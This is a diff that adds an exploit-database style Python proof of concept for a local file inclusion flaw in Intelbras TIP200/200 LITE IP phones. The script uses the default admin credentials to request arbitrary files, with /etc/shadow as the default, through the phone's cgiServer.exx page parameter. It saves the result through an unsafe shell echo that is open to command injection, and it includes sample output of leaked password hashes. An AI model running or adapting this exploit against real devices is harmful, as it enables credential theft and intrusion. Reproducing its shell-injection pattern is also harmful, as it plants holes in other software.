@@ -1,0 +1,61 @@
+# Exploit Title: [INTELBRAS TELEFONE IP TIP200/200 LITE Local File Include]
+# Google Dork: []
+# Date: 16/03/2018
+# Exploit Author: [Matheus Goncalves - anhax0r]
+# Vendor Homepage: [https://www.facebook.com/anhaxteam/]
+# Software Link: []
+# Version: [60.0.75.29] (REQUIRED)
+# Tested on: [Debian]
+# CVE : [if applicable]
+
+
+#Remember that you need login with admin credentials to download files !!! in this case, i used default credentials
+
+import requests as http
+import subprocess
+import os
+from requests.auth import HTTPBasicAuth
+def poc():
+    print("""                -------------------------------------------------------------------------------------------------------------
+                ------------- 0day: TELEFONE IP TIP200/200 LITE | Local File Include | Local File Download-------------------
+                -------------      P0c Author: Matheus Goncalves | Pentester at Anhax Security Team       -------------------
+                -------------------------------------------------------------------------------------------------------------\n""")
+    filename = raw_input("filename Ex: /etc/shadow: -> ")
+    if(filename == ""):
+        filename="/etc/shadow"
+    r = http.get("http://192.168.0.207/cgi-bin/cgiServer.exx?page="+str(filename), auth=HTTPBasicAuth('admin', 'admin'))
+    print(" ")
+    text = r.text
+    
+    print(text)
+    savefile = raw_input("Save file? [Y\\n]: ")
+    savefile.upper()
+    if(savefile=="Y" or savefile=="y"):
+        os.system("echo '"+text+"' > "+filename.replace("/etc/", ""))
+        print("File saved !!")
+        start()
+    else:
+        start()
+            
+def start():
+    poc()
+    
+start()
+
+
+#root@hax:~/itscanner# python p0c.py 
+#                -------------------------------------------------------------------------------------------------------------
+#                ------------- 0day: TELEFONE IP TIP200/200 LITE | Local File Include |-------------------
+#                -------------      P0c Author: Matheus Goncalves | Pentester at Anhax Security Team       -------------------
+#                -------------------------------------------------------------------------------------------------------------
+#filename Ex: /etc/shadow: -> /etc/shadow
+ 
+#root:$1$83hUAZ/2$GKlGOZlepa6eikA6mfG1l/:11876:0:99999:7:::
+#admin:DP7Kg4tE0Y9rs:11876:0:99999:7:::
+
+#Save file? [Y\n]: y
+#File saved !!
+
+#root@hax:~/itscanner# cat shadow 
+#root:$1$83hUAZ/2$GKlGOZlepa6eikA6mfG1l/:11876:0:99999:7:::
+#admin:DP7Kg4tE0Y9rs:11876:0:99999:7:::
